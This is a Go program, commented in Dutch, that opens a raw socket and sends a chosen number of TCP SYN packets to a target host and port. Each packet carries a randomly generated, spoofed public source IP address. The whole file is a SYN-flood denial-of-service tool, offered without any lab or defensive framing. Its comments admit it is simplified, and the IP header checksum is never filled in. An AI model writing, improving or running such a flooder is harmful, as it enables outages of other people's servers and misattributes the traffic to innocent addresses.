package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
	"syscall"
)

func main() {
	if len(os.Args) != 5 {
		log.Fatalf("Usage: %s <interface> <host> <port> <packets>", os.Args[0])
	}

	host := os.Args[2]
	port, err := strconv.Atoi(os.Args[3])
	if err != nil {
		log.Fatalf("Invalid port: %v", err)
	}
	packets, err := strconv.Atoi(os.Args[4])
	if err != nil {
		log.Fatalf("Invalid number of packets: %v", err)
	}

	dstIP := net.ParseIP(host)
	dstPort := uint16(port)

	for i := 0; i < packets; i++ {
		srcIP := generateRandomPublicIP()
		sendTCPSYN(srcIP, dstIP, dstPort)
	}
}

func sendTCPSYN(srcIP string, dstIP net.IP, dstPort uint16) {
	// Maak een RAW socket
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		log.Fatalf("Failed to create socket: %v", err)
	}
	defer syscall.Close(fd)

	// Stel de IP_HDRINCL optie in zodat we onze eigen IP-header kunnen opgeven
	if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
		log.Fatalf("Failed to set IP_HDRINCL: %v", err)
	}

	// Bouw het TCP SYN-pakket
	packet := makeTCPSYNPacket(srcIP, dstIP, dstPort)

	// Specificeer de bestemmingsadresstructuur
	addr := syscall.SockaddrInet4{
		Port: int(dstPort),
		Addr: [4]byte{dstIP[0], dstIP[1], dstIP[2], dstIP[3]},
	}

	// Verzend het pakket
	if err := syscall.Sendto(fd, packet, 0, &addr); err != nil {
		log.Fatalf("Failed to send packet: %v", err)
	}
}

func makeTCPSYNPacket(srcIP string, dstIP net.IP, dstPort uint16) []byte {
	// Dit is een zeer basisvoorbeeld en mist vele vereiste stappen voor een volledig functioneel pakket
	var packet []byte

	// Voorbeeld IP-header (vereenvoudigd)
	ipHeader := make([]byte, 20)
	ipHeader[0] = 0x45                            // Version en IHL
	ipHeader[1] = 0x00                            // Type of Service
	binary.BigEndian.PutUint16(ipHeader[2:4], 40) // Totale lengte
	binary.BigEndian.PutUint16(ipHeader[4:6], 1)  // Identificatie
	binary.BigEndian.PutUint16(ipHeader[6:8], 0)  // Flags en Fragment Offset
	ipHeader[8] = 64                              // TTL
	ipHeader[9] = 6                               // Protocol (TCP)
	// Header checksum wordt later berekend
	copy(ipHeader[12:16], net.ParseIP(srcIP).To4()) // Bron IP (Vervang dit met een geldig bron-IP)
	copy(ipHeader[16:20], dstIP.To4())              // Doel IP

	// Voorbeeld TCP-header (vereenvoudigd)
	tcpHeader := make([]byte, 20)
	binary.BigEndian.PutUint16(tcpHeader[0:2], 12345)   // Bronpoort
	binary.BigEndian.PutUint16(tcpHeader[2:4], dstPort) // Doelpoort
	binary.BigEndian.PutUint32(tcpHeader[4:8], 0)       // Sequence nummer
	binary.BigEndian.PutUint32(tcpHeader[8:12], 0)      // Acknowledgement nummer
	tcpHeader[12] = 0x50                                // Data offset en gereserveerd
	tcpHeader[13] = 0x02                                // Flags (SYN)
	binary.BigEndian.PutUint16(tcpHeader[14:16], 14600) // Window size
	// Checksum en urgent pointer worden later berekend

	// Voeg de pseudo-header toe voor checksumberekening
	pseudoHeader := makePseudoHeader(srcIP, dstIP, 6, uint16(len(tcpHeader)))
	checksumData := append(pseudoHeader, tcpHeader...)
	binary.BigEndian.PutUint16(tcpHeader[16:18], calculateChecksum(checksumData)) // Checksum

	packet = append(ipHeader, tcpHeader...)
	return packet
}

func makePseudoHeader(srcIP string, dstIP net.IP, protocol uint8, tcpLength uint16) []byte {
	pseudoHeader := make([]byte, 12)
	copy(pseudoHeader[0:4], net.ParseIP(srcIP).To4())          // Bron IP
	copy(pseudoHeader[4:8], dstIP.To4())                       // Doel IP
	pseudoHeader[8] = 0                                        // Gereserveerd
	pseudoHeader[9] = protocol                                 // Protocol
	binary.BigEndian.PutUint16(pseudoHeader[10:12], tcpLength) // TCP-lengte

	return pseudoHeader
}

func calculateChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 + uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8 // Voeg de laatste byte toe als de lengte oneven is
	}
	sum = (sum >> 16) + (sum & 0xFFFF)
	sum += sum >> 16
	return uint16(^sum)
}

func isPrivateIP(oct1, oct2 int) bool {
	if oct1 == 10 {
		return true
	}
	if oct1 == 172 && (oct2 >= 16 && oct2 <= 31) {
		return true
	}
	if oct1 == 192 && oct2 == 168 {
		return true
	}
	if oct1 == 127 {
		return true
	}
	if oct1 == 169 && oct2 == 254 {
		return true
	}
	return false
}

func generateRandomPublicIP() string {
	var oct1, oct2 int
	for {
		oct1 = rand.Intn(256)
		oct2 = rand.Intn(256)
		if !isPrivateIP(oct1, oct2) {
			break
		}
	}
	return fmt.Sprintf("%d.%d.%d.%d",
		oct1,
		oct2,
		rand.Intn(256),
		rand.Intn(256))
}
